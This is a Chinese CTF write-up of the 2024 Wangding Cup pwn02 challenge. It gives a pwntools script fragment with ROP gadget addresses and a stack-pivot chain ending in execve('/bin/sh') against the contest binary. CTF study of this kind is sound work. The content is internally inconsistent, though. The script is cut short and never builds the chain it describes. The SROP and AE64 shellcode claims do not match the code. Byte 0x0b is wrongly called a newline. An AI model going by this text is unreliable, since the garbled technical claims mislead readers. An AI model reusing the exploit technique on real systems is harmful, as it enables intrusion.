---
title: 2024 第四届"网鼎杯"玄武组 pwn02 writeup（fork + ret2syscall 栈迁移）
contest: 2024 第四届网鼎杯
year: 2024
difficulty: hard
vuln_type: [srop, ret2libc, rop, shellcode]
tags: [玄武 pwn02, x11x11x11... 绕过检测, fork 后栈溢出, pwndbg 不能跟 fork, 通用 gadget 链 rax/rdi/rsi/rdx/rbp/leave_ret, AE64 shellcode 编码, libc-2.35 SROP 栈迁移, read 写 bss 0x4C72A0+0x100, execve /bin/sh]
attack_chain:
  - x11x11x11... 绕过前段检测
  - 进 fork 子进程，栈溢出
  - pwndbg 不能跟 fork → 直接打 ret2syscall
  - 通用 gadget: rax=0x450277, rdi=0x40213f, rsi=0x40a1ae, rdx=0x485feb, rbp=0x401771, syscall=0x41ac26, leave_ret=0x40192F
  - 第一次 read 写 bss 0x4C72A0+0x100 拿到 execve 链子
  - 第二次 execve("/bin/sh", 0, 0)
key_payload: "rax=0x450277; rdi=0x40213f; rsi=0x40a1ae; rdx=0x485feb; rbp=0x401771; syscall=0x41ac26; leave_ret=0x40192F"
one_liner: 玄武 pwn02：fork 后栈溢出 + 通用 gadget 链 SROP + read 写 bss + AE64 shellcode 编码 — 大程序最常用 ROP 套路。
lesson: pwndbg 不能跟 fork 是 GDB 调试盲点，要么用 `set follow-fork-mode parent/child` 切换，要么干脆单步 payload 直出；AE64 库用来编码 shellcode 绕过字符过滤（pwntools `asm(shellcraft.sh())` 经常含坏字符）。
quality: high
---

# 2024 第四届"网鼎杯"玄武组 pwn02

```python
from pwn import *
from ae64 import AE64
context(os='linux', arch='amd64', log_level='debug')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc-2.35-0ubuntu3.8_amd64 也行
elf = ELF('./pwn')
p = process('./pwn')

rax = 0x0000000000450277
rdi = 0x000000000040213f
rsi = 0x000000000040a1ae
rdx = 0x0000000000485feb
rbp = 0x0000000000401771
bss = 0x4C72A0 + 0x100
syscall = 0x000000000041ac26
leave_ret = 0x40192F

rl(b"gift: ")
gift = int(p.recv(18), 16)
li(hex(gift))
pay = p64(1) * 8
s(pay)
rl("Wanna return?\n")
s(b'a')
```

## 攻击链

1. **第一段 read**：写入 `x11x11x11...` 绕过前段检测，进入 fork 子进程。
2. **栈溢出**：子进程栈溢出到 `vuln` 函数。
3. **栈迁移**：用 `leave_ret` 跳到 `gift`（栈地址）。
4. **第一次 read**：通过 ROP 链读 bss `0x4C72A0+0x100` 拿 execve 链子。
5. **第二次 execve**：rax=0x3B + rdi=/bin/sh + rsi=0 + rdx=0 → `syscall` 拿 shell。

## 关键点

- **fork 调试**：`pwndbg` 默认不跟 fork 子进程，要么 `set follow-fork-mode child` 要么干脆 payload 直出。
- **AE64 shellcode 编码**：pwntools `asm(shellcraft.sh())` 经常含 `0x0b`（换行）这种坏字符，AE64 用 xor + 自解码 stub 绕过。
- **SROP 栈迁移**：通用 gadget `rax=0x450277` 是大程序里非常常见的 pop rax; ret。
